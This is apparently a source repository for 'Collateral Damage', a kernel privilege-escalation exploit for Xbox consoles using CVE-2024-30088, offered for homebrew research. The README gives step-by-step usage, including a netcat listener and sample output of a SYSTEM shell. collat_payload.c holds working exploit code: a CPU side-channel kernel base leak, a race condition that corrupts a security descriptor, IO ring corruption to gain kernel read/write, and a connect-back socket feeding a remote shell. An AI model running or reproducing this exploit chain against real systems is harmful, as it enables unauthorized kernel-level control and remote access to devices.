Project Path: arc_gmh5225_collateral-damage_fc6b3a86

Source Tree:

```txt
arc_gmh5225_collateral-damage_fc6b3a86
├── LICENSE
├── README.md
├── collat_payload
│   ├── collat_payload.c
│   ├── collat_payload.vcxproj
│   ├── collat_payload.vcxproj.filters
│   ├── ioring.h
│   ├── ioring_lpe.c
│   ├── nt_offsets.c
│   ├── nt_offsets.h
│   ├── post_exploit.c
│   ├── post_exploit.h
│   ├── prefetch_asm.asm
│   └── win_defs.h
├── collat_payload.sln
├── ntdll.def
├── ntdll.exp
├── ntdll.lib
└── solstice_artifacts
    ├── gamescript_autosave.txt
    ├── gamescript_autosave_network.txt
    ├── payload_server_win_x64.exe
    └── stage2.bin

```

`LICENSE`:

```
MIT License

Copyright (c) 2024 Exploits.Forsale

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

```

`README.md`:

```md
# Collateral Damage
Collateral Damage is a kernel exploit for Xbox SystemOS using [CVE-2024-30088](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30088).
It targets Xbox One and Xbox Series consoles running kernel versions 25398.4478, 25398.4908, and 25398.4909. The initial entrypoint is via the Game Script UWP application.

The first stage payloads, PE loader and network loader are provided by [Solstice](https://github.com/exploits-forsale/solstice).

This exploit was developed by [Emma Kirkpatrick](https://x.com/carrot_c4k3) (vulnerability discovery & exploitation) and [Lander Brandt](https://x.com/landaire) (Solstice)

## Important Caveats

To place the payload locally on the Xbox console a full-trust explorer like [Adv File Explorer (FullTrust)](https://apps.microsoft.com/detail/9nbnjpsxfsqb) is recommended. Alternatively, the initial payload can be served via a USB keyboard simulator (rubber ducky etc.) and further payload stages can then be loaded over the network.

The reverse shell example provided here requires that your console is connected to a network. When connecting your console to a network be very careful to avoid connecting to the internet and updating. Try to block connectivity to Xbox LIVE as 
much as possible, at the very least by setting your DNS to invalid servers.

This exploit is not fully reliable. It relies on a CPU side channel as well as a race condition, both of which have the potential to fail. In the event of a failure, the exploit may alert you that it has failed via network output, or the console itself may crash and reboot.

## Usage

- Modify line 7 of `gamescript_autosave_network.txt` or `gamescript_autosave.txt` to contain the local IP of your PC.
  - For use with Full-Trust File Explorer App: Copy `gamescript_autosave.txt`, `stage2.bin`, and `run.exe` to the `LocalState` directory of the Game Script application on your Console (`Q:\Users\UserMgr0\AppData\Local\Packages\27878ConstantineTarasenko.458004FD2C47C_c8b3w9r5va522\LocalState\`)
  - For HID / Keyboard simulator input: Type the contents of `gamescript_autosave_network.txt` into the GameScript window. Serve `stage2.bin` and `run.exe` via `payload_server_win_x64.exe --stage2 stage2.bin --run run.exe`
- Listen on port 7070 on your PC using netcat or a similar tool (command example: `nc64.exe -lvnp 7070`)
- Open the Game Script application on your console and select "Show Code Run window" and click "Run code once"
- If the exploit is success you should see output on your PC that resembles the following:
```
listening on [any] 7070 ...
connect to [192.168.0.61] from (UNKNOWN) [192.168.0.130] 49665
Collateral Damage - @carrot_c4k3 & @landaire (exploits.forsale)
Build number: 25398.4478
Attempting to find kernel base...
Found likely kernel base: FFFFF80AF9800000
Attempting exploit...
Exploit succeeded! Running payload!

Microsoft Windows [Version 10.0.25398.4478]
Copyright (c) Microsoft Corporation. All rights reserved.

S:\>
```

## Experimentation
Lots of additional work is needed to bring this to the point of being a user-friendly tool for loading homebrew onto the Xbox, but I hope that this provides a good starting point :) If you would like to play around with running code as SYSTEM you can put your code in the `post_exploit` function in `post_exploit.c`.

## Further Work
There is lots more to do on this, but as the kernel part is done I wanted to share it with the community so developers could start poking around with SYSTEM privileges. Here are a few things that I am still hoping to add in the future:
- Side loading support
- Unsigned non-UWP process launching
- SSH support

Additional ideas are welcome :)

## Thanks
thank you to everyone who helped me brainstorm and shared their knowledge and time with me throughout this!!! some of those who i would like to show appreciation to:

- chompie
- tuxuser
- baw
- [Xbox One Research](https://xboxoneresearch.github.io/)
- XBOX-SCENE Discord
```

`collat_payload.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 17
VisualStudioVersion = 17.9.34728.123
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "collat_payload", "collat_payload\collat_payload.vcxproj", "{C8172E40-5D40-417A-A6A4-E233C0D1AC12}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|x64 = Debug|x64
		Debug|x86 = Debug|x86
		Release|x64 = Release|x64
		Release|x86 = Release|x86
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{C8172E40-5D40-417A-A6A4-E233C0D1AC12}.Debug|x64.ActiveCfg = Debug|x64
		{C8172E40-5D40-417A-A6A4-E233C0D1AC12}.Debug|x64.Build.0 = Debug|x64
		{C8172E40-5D40-417A-A6A4-E233C0D1AC12}.Debug|x86.ActiveCfg = Debug|Win32
		{C8172E40-5D40-417A-A6A4-E233C0D1AC12}.Debug|x86.Build.0 = Debug|Win32
		{C8172E40-5D40-417A-A6A4-E233C0D1AC12}.Release|x64.ActiveCfg = Release|x64
		{C8172E40-5D40-417A-A6A4-E233C0D1AC12}.Release|x64.Build.0 = Release|x64
		{C8172E40-5D40-417A-A6A4-E233C0D1AC12}.Release|x86.ActiveCfg = Release|Win32
		{C8172E40-5D40-417A-A6A4-E233C0D1AC12}.Release|x86.Build.0 = Release|Win32
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {787BF3D5-0C80-4BB2-9A46-47BE0999B6CD}
	EndGlobalSection
EndGlobal

```

`collat_payload/collat_payload.c`:

```c
//
// Collateral Damage - Emma Kirkpatrick @carrot_c4k3 & Lander Brandt @landaire (exploits.forsale)
//
#include <Windows.h>
#include <stdio.h>
#include <winternl.h>
#include <sddl.h>
#include <winsock2.h>

#include "ioring.h"
#include "nt_offsets.h"

// socket stuff
WSADATA wsaData;
SOCKET winSock;
struct sockaddr_in sockAddr;
int port = 7070;


// struct representing the info passed in from gamescript at a static address
typedef struct _COLLAT_INFO {
    CHAR ip_addr[0x20];
} COLLAT_INFO;

#define GLOBAL_INFO ((COLLAT_INFO*)0x44000000)

ULONG64 ullSystemEPROCaddr = 0;
UINT64 g_kernel_base = 0;


// misc windows definitions
#define STATUS_SUCCESS ((NTSTATUS)0)
#define STATUS_INFO_LENGTH_MISMATCH      ((NTSTATUS)0xC0000004L)
#define SystemBuildVersionInformation 222

NTSYSCALLAPI
NTSTATUS
NTAPI
NtQueryInformationToken(
    _In_ HANDLE TokenHandle,
    _In_ TOKEN_INFORMATION_CLASS TokenInformationClass,
    _Out_writes_bytes_to_opt_(TokenInformationLength, *ReturnLength) PVOID TokenInformation,
    _In_ ULONG TokenInformationLength,
    _Out_ PULONG ReturnLength
);

// All the code for triggering the bug lives here
volatile ULONG64* smash_ptr = NULL;
ULONG64 smash_var = 0;

// this function will run in a second thread to attempt to trigger the bug
DWORD smash_func(LPVOID unused)
{
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);

    ULONG64 val = smash_var;
    while (1) {
        *smash_ptr = val;
    }

    return 0;
}

WCHAR* magic_str = L"TSA://ProcUnique";
HANDLE token_handle = INVALID_HANDLE_VALUE;
BYTE output_buf[0x8000];
DWORD bytes_returned = 0;
WCHAR* test_ptr = 0;

VOID do_write(UINT64 addr)
{
    smash_var = addr;

    HANDLE hthread = CreateThread(NULL, 0, smash_func, NULL, 0, NULL);

    for (UINT i = 0; i < 0x80000; i++) //while (1)
    {
        *test_ptr = 0;
        NtQueryInformationToken(token_handle, TokenAccessInformation, output_buf, sizeof(output_buf), &bytes_returned);
        if (*test_ptr == 0)
        {
            break;
        }
    }
    TerminateThread(hthread, 0);
}

// build a security descriptor which is accessible to our process
void setup_sd()
{
    PBYTE sd_page = VirtualAlloc(0x65000000, 0x100000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

    PBYTE psid_system = sd_page;
    psid_system[0] = 0x01;
    psid_system[1] = 0x01;
    psid_system[2] = 0x00;
    psid_system[3] = 0x00;
    psid_system[4] = 0x00;
    psid_system[5] = 0x00;
    psid_system[6] = 0x00;
    psid_system[7] = 0x05;
    psid_system[8] = 0x12;
    psid_system[9] = 0x00;
    psid_system[10] = 0x00;
    psid_system[11] = 0x00;
    psid_system[12] = 0x00;
    psid_system[13] = 0x00;
    psid_system[14] = 0x00;
    psid_system[15] = 0x00;

    PBYTE sacl_ptr = sd_page + 0x100;
    sacl_ptr[0] = 0x02;
    sacl_ptr[1] = 0x00;
    sacl_ptr[2] = 0x20;
    sacl_ptr[3] = 0x00;
    sacl_ptr[4] = 0x01;
    sacl_ptr[5] = 0x00;
    sacl_ptr[6] = 0x00;
    sacl_ptr[7] = 0x00;
    sacl_ptr[8] = 0x11;
    sacl_ptr[9] = 0x00;
    sacl_ptr[10] = 0x14;
    sacl_ptr[11] = 0x00;
    sacl_ptr[12] = 0x02;
    sacl_ptr[13] = 0x00;
    sacl_ptr[14] = 0x00;
    sacl_ptr[15] = 0x00;
    sacl_ptr[16] = 0x01;
    sacl_ptr[17] = 0x01;
    sacl_ptr[18] = 0x00;
    sacl_ptr[19] = 0x00;
    sacl_ptr[20] = 0x00;
    sacl_ptr[21] = 0x00;
    sacl_ptr[22] = 0x00;
    sacl_ptr[23] = 0x10;
    sacl_ptr[24] = 0x00;
    sacl_ptr[25] = 0x10;
    sacl_ptr[26] = 0x00;
    sacl_ptr[27] = 0x00;
    sacl_ptr[28] = 0x00;
    sacl_ptr[29] = 0x00;

    PBYTE dacl_ptr = sd_page + 0x200;
    dacl_ptr[0] = 0x02;
    dacl_ptr[1] = 0x00;
    dacl_ptr[2] = 0x00;
    dacl_ptr[3] = 0x01;
    dacl_ptr[4] = 0x02;
    dacl_ptr[5] = 0x00;
    dacl_ptr[6] = 0x00;
    dacl_ptr[7] = 0x00;
    dacl_ptr[8] = 0x00;
    dacl_ptr[9] = 0x00;
    dacl_ptr[10] = 0x18;
    dacl_ptr[11] = 0x00;
    dacl_ptr[12] = 0xFF;
    dacl_ptr[13] = 0xFF;
    dacl_ptr[14] = 0xFF;
    dacl_ptr[15] = 0xFF;
    dacl_ptr[16] = 0x01;
    dacl_ptr[17] = 0x02;
    dacl_ptr[18] = 0x00;
    dacl_ptr[19] = 0x00;
    dacl_ptr[20] = 0x00;
    dacl_ptr[21] = 0x00;
    dacl_ptr[22] = 0x00;
    dacl_ptr[23] = 0x0F;
    dacl_ptr[24] = 0x02;
    dacl_ptr[25] = 0x00;
    dacl_ptr[26] = 0x00;
    dacl_ptr[27] = 0x00;
    dacl_ptr[28] = 0x01;
    dacl_ptr[29] = 0x00;
    dacl_ptr[30] = 0x00;
    dacl_ptr[31] = 0x00;
    dacl_ptr[32] = 0x00;
    dacl_ptr[33] = 0x00;
    dacl_ptr[34] = 0x14;
    dacl_ptr[35] = 0x00;
    dacl_ptr[36] = 0xFF;
    dacl_ptr[37] = 0xFF;
    dacl_ptr[38] = 0xFF;
    dacl_ptr[39] = 0xFF;
    dacl_ptr[40] = 0x01;
    dacl_ptr[41] = 0x01;
    dacl_ptr[42] = 0x00;
    dacl_ptr[43] = 0x00;
    dacl_ptr[44] = 0x00;
    dacl_ptr[45] = 0x00;
    dacl_ptr[46] = 0x00;
    dacl_ptr[47] = 0x01;
    dacl_ptr[48] = 0x00;
    dacl_ptr[49] = 0x00;
    dacl_ptr[50] = 0x00;
    dacl_ptr[51] = 0x00;

    PISECURITY_DESCRIPTOR sd = 0x65007500;
    sd->Revision = 1;
    sd->Sbz1 = 0;
    sd->Control = 0x14;
    sd->Owner = psid_system;
    sd->Group = psid_system;
    sd->Sacl = sacl_ptr;
    sd->Dacl = dacl_ptr;
    return 0;
}

int do_exploit()
{
    ULONG sd_ptr_offset = get_sd_ptr_offset();

    // map the fake security descriptor that we will be swapping the real one with
    setup_sd();

    // grab the kernel base first!
    ULONG ret_len = 0;
    UINT64 nt_base = g_kernel_base;

    // get our token handle so we can prepare to trigger the bug
    OpenProcessToken(GetCurrentProcess(), MAXIMUM_ALLOWED, &token_handle);
    NtQueryInformationToken(token_handle, TokenAccessInformation, output_buf, sizeof(output_buf), &bytes_returned);

    // search for the string attribute string ("TSA://ProcUnique")
    UINT64 magic_ptr = 0;
    for (UINT i = 0; i < sizeof(output_buf) - 0x20; i++)
    {
        if (memcmp(&output_buf[i], magic_str, 0x20) == 0) {
            magic_ptr = &output_buf[i];
            break;
        }
    }
    test_ptr = magic_ptr;

    // search for the pointer to the string to get the actual smash target
    for (UINT i = 0; i < sizeof(output_buf) - 0x20; i++)
    {
        if (memcmp(&output_buf[i], &magic_ptr, 8) == 0) {
            smash_ptr = &output_buf[i];
            break;
        }
    }

    getobjptr(&ullSystemEPROCaddr, 4, 4);

    // corrupt the security descriptor
    do_write(nt_base + sd_ptr_offset - 0x18);
    do_write(nt_base + sd_ptr_offset - 0x18 - 1);
    do_write(nt_base + sd_ptr_offset - 0x18 - 2);
    do_write(nt_base + sd_ptr_offset - 0x18 - 3);

    ullSystemEPROCaddr = 0;
    getobjptr(&ullSystemEPROCaddr, 4, 4);

    return 0;
}

#define STEP 0x100000
#define ITERATIONS 0x80
#define DUMMY_ITERATIONS 5
#define KERNEL_LOWER_BOUND 0xFFFFF80000A00000ull
#define KERNEL_UPPER_BOUND 0xfffff81000000000ull
#define ADDR_COUNT ((KERNEL_UPPER_BOUND - KERNEL_LOWER_BOUND) / STEP)

typedef struct _MEM_RANGE {
    UINT64 addr;
    UINT64 count;
} MEM_RANGE;

void bad_syscall();
UINT64 sidechannel(PVOID ptr);

MEM_RANGE* g_ranges_ptr;
UINT32 g_ranges_count;

VOID dump_timings(const char* output_file, PUINT32 timings)
{
    HANDLE h_file = CreateFileA(output_file, GENERIC_WRITE,          // open for writing
        0,                      // do not share
        NULL,                   // default security
        CREATE_NEW,             // create new file only
        FILE_ATTRIBUTE_NORMAL,  // normal file
        NULL);

    DWORD bytes_written = 0;

    // write out the consts
    UINT32 f_step = STEP;
    UINT32 f_iterations = ITERATIONS;
    UINT32 f_dummy_iterations = DUMMY_ITERATIONS;
    UINT32 f_addr_count = ADDR_COUNT;
    UINT64 f_start_addr = KERNEL_LOWER_BOUND;
    // Uncomment to re-enable dumping timings to disc
    WriteFile(h_file, &f_step, sizeof(f_step), &bytes_written, 0);
    WriteFile(h_file, &f_iterations, sizeof(f_iterations), &bytes_written, 0);
    WriteFile(h_file, &f_dummy_iterations, sizeof(f_dummy_iterations), &bytes_written, 0);
    WriteFile(h_file, &f_addr_count, sizeof(f_addr_count), &bytes_written, 0);
    WriteFile(h_file, &f_start_addr, sizeof(f_start_addr), &bytes_written, 0);
    WriteFile(h_file, timings, (ADDR_COUNT * ITERATIONS) * sizeof(UINT32), &bytes_written, 0);
    

    FlushFileBuffers(h_file);
    CloseHandle(h_file);
}

UINT64 do_sidechannel(/*SHELLCODE_CTX* ctx, const char* dump_path*/)
{
    CHAR dump_path[0x200] = { 0 };
    ExpandEnvironmentStringsA("%LOCALAPPDATA%\\..\\LocalState\\timings.bin", dump_path, sizeof(dump_path));

    HANDLE h_heap = GetProcessHeap();
    PUINT32 timings = HeapAlloc(h_heap, 0, (ADDR_COUNT * ITERATIONS) * sizeof(UINT32));
    PUINT32 avgs = HeapAlloc(h_heap, 0, ADDR_COUNT * sizeof(UINT32));
    MEM_RANGE* ranges = HeapAlloc(h_heap, 0, sizeof(MEM_RANGE) * 0x400);
    UINT32 ranges_count = 0;
    UINT64 avg_total = 0;
    UINT64 threshold = 0;
    for (UINT64 i = 0; i < ITERATIONS + DUMMY_ITERATIONS; i++) {
        UINT64 x = 0;
        UINT64 addr = KERNEL_LOWER_BOUND;
        while (x < ADDR_COUNT)
        {
            UINT64 addr = KERNEL_LOWER_BOUND + (x * STEP);
            UINT64 res = sidechannel(addr);
            if (i >= DUMMY_ITERATIONS) {
                timings[(x * ITERATIONS) + (i - DUMMY_ITERATIONS)] = res;
            }
            x++;
        }
    }

    //dump_timings(dump_path, timings);

    // take avgs
    for (UINT64 x = 0; x < ADDR_COUNT; x++)
    {
        UINT64 avg = 0;
        for (UINT64 i = 0; i < ITERATIONS; i++)
        {
            avg += timings[(x * ITERATIONS) + i];
        }
        avg /= ITERATIONS;
        avgs[x] = avg;
    }

    // account for anomalies on boundaries
    for (UINT64 x = 0; x < ADDR_COUNT; x++)
    {
        UINT64 addr = KERNEL_LOWER_BOUND + (x * STEP);
        if (addr % 0x2000000 == 0)
        {
            if (x + 1 < ADDR_COUNT) {
                avgs[x] = avgs[x + 1];
            }
            else {
                avgs[x] = avgs[x - 1];
            }
        }
        avg_total += avgs[x];
    }

    avg_total /= ADDR_COUNT;
    threshold = avg_total + (avg_total / 3);

    UINT64 cur_range = 0;
    UINT64 cur_range_len = 0;
    for (UINT64 i = 0; i < ADDR_COUNT; i++)
    {
        UINT32 cur_timing = avgs[i];
        if (cur_timing > threshold) {
            if (cur_range) {
                cur_range_len++;
            }
            else {
                cur_range = i;
                cur_range_len = 1;
            }
        }
        else {
            if (cur_range) {
                if (cur_range_len > 4) {
                    ranges[ranges_count].addr = KERNEL_LOWER_BOUND + ((i - cur_range_len) * STEP);
                    ranges[ranges_count].count = cur_range_len;
                    ranges_count++;
                }

                cur_range_len = 0;
            }
        }
    }

    HeapFree(h_heap, 0, timings);
    HeapFree(h_heap, 0, avgs);
    g_ranges_ptr = ranges;
    g_ranges_count = ranges_count;

    UINT64 kernel_base = 0;

    for (int i = 0; i < ranges_count; i++) {
        UINT64 cur_addr = ranges[i].addr;
        UINT64 cur_count = ranges[i].count;

        if (cur_count > 80 && cur_count < 120) {
            kernel_base = cur_addr - 0x600000;
            break;
        }
    }

    return kernel_base;
}

int main(int argc, char** argv)
{
    DWORD bytes_written = 0;
    UINT64 ioring_addr = 0;
    ULONG build_rev = 0;
	CHAR path[0x400] = { 0 };
    CHAR ptr_msg[0x400] = { 0 };
    CHAR* cur_msg = NULL;
	CHAR* file_part = NULL;

    // Connect to the host for logging & remote shell
    int start = WSAStartup(MAKEWORD(2, 2), &wsaData);
    winSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    sockAddr.sin_family = AF_INET;
    sockAddr.sin_port = htons(port);
    sockAddr.sin_addr.s_addr = inet_addr(GLOBAL_INFO->ip_addr);
    WSAConnect(winSock, (SOCKADDR*)&sockAddr, sizeof(sockAddr), NULL, NULL, NULL, NULL);

    // Write our banner message
    cur_msg = "Collateral Damage - @carrot_c4k3 & @landaire (exploits.forsale)\n";
    send(winSock, cur_msg, strlen(cur_msg), 0);

    // Get and print the build number
    ULONG ret_len = 0;
    SYSTEM_BUILD_VERSION_INFORMATION build_version = { 0 };
    ULONG layer = 0;
    NtQuerySystemInformationEx(SystemBuildVersionInformation, &layer, sizeof(layer), &build_version, sizeof(build_version), &ret_len);
    sprintf_s(ptr_msg, sizeof(ptr_msg), "Build number: %i.%i\n", build_version.NtBuildNumber, build_version.NtBuildQfe);
    send(winSock, ptr_msg, strlen(ptr_msg), 0);

    // Check that the build is supported
    if (build_version.NtBuildNumber == 25398)
    {
        if (build_version.NtBuildQfe == 4478)
        {
            build_rev = 4478;
        }
        else if (build_version.NtBuildQfe == 4908 || build_version.NtBuildQfe == 4909)
        {
            // offsets are the same for 4908 and 4909
            build_rev = 4908;
        }
    }

    if (build_rev == 0)
    {
        cur_msg = "Unsupported build! Aborting.\n";
        send(winSock, cur_msg, strlen(cur_msg), 0);
        exit(0);
    }

    set_build_rev(build_rev);

    // Attempt to leak the kernel address
    cur_msg = "Attempting to find kernel base...\n";
    send(winSock, cur_msg, strlen(cur_msg), 0);
    FlushFileBuffers(winSock);
    UINT64 nt_base = do_sidechannel();
    g_kernel_base = nt_base;

    // If it fails bail and tell the user to reboot
    if (nt_base == 0)
    {
        cur_msg = "Failed to find kernel base! Reboot your console and try again.\n";
        send(winSock, cur_msg, strlen(cur_msg), 0);
        exit(0);
        return 0;
    }

    // Log the kernel base we leaked
    sprintf_s(ptr_msg, sizeof(ptr_msg), "Found likely kernel base: %p\n", nt_base);
    send(winSock, ptr_msg, strlen(ptr_msg), 0);
    
    // Do the first part of the exploit: corrupting SeMediumDaclSd
    cur_msg = "Attempting exploit...\n";
    send(winSock, cur_msg, strlen(cur_msg), 0);
    do_exploit();

    // If we succeeded the system EPROC should be non-null
    if (ullSystemEPROCaddr == 0)
    {
        cur_msg = "Exploit failed! Reboot your console and try again.\n";
        send(winSock, cur_msg, strlen(cur_msg), 0);
        exit(0);
        return 0;
    }

    // Setup the IO ring
    ioring_addr = 0;
    int res = ioring_setup(&ioring_addr);
    if (res != 0)
    {
        sprintf_s(ptr_msg, sizeof(ptr_msg), "IO Ring setup failed. Result: %i\nReboot your console and try again.\n", res);
        send(winSock, ptr_msg, strlen(ptr_msg), 0);
    }

    // Corrupt the IO ring object
    do_write(ioring_addr + 0x9D);

    // Get kernel RW & elevate our process, then fix up SeMediumDaclSd
    ioring_lpe2(GetCurrentProcessId(), 0x65007500, 0x1000, ioring_addr, g_kernel_base);
    cur_msg = "Exploit succeeded! Running payload!\n\n";
    send(winSock, cur_msg, strlen(cur_msg), 0);

    // Run our post-exploitation code
    post_exploit(winSock);
    

	return 0;
}
```

`collat_payload/collat_payload.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="collat_payload.c" />
    <ClCompile Include="ioring_lpe.c" />
    <ClCompile Include="nt_offsets.c" />
    <ClCompile Include="post_exploit.c" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="ioring.h" />
    <ClInclude Include="nt_offsets.h" />
    <ClInclude Include="post_exploit.h" />
    <ClInclude Include="win_defs.h" />
  </ItemGroup>
  <ItemGroup>
    <MASM Include="prefetch_asm.asm" />
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>17.0</VCProjectVersion>
    <Keyword>Win32Proj</Keyword>
    <ProjectGuid>{c8172e40-5d40-417a-a6a4-e233c0d1ac12}</ProjectGuid>
    <RootNamespace>collatpayload</RootNamespace>
    <WindowsTargetPlatformVersion>10.0.22621.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
    <Import Project="$(VCTargetsPath)\BuildCustomizations\masm.props" />
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_WINSOCKAPI_;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
      <BufferSecurityCheck>false</BufferSecurityCheck>
      <ErrorReporting>None</ErrorReporting>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <AdditionalDependencies>onecoreuap.lib;$(SolutionDir)ntdll.lib</AdditionalDependencies>
    </Link>
  </ItemDefinitionGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
    <Import Project="$(VCTargetsPath)\BuildCustomizations\masm.targets" />
  </ImportGroup>
</Project>

```

`collat_payload/collat_payload.vcxproj.filters`:

```filters
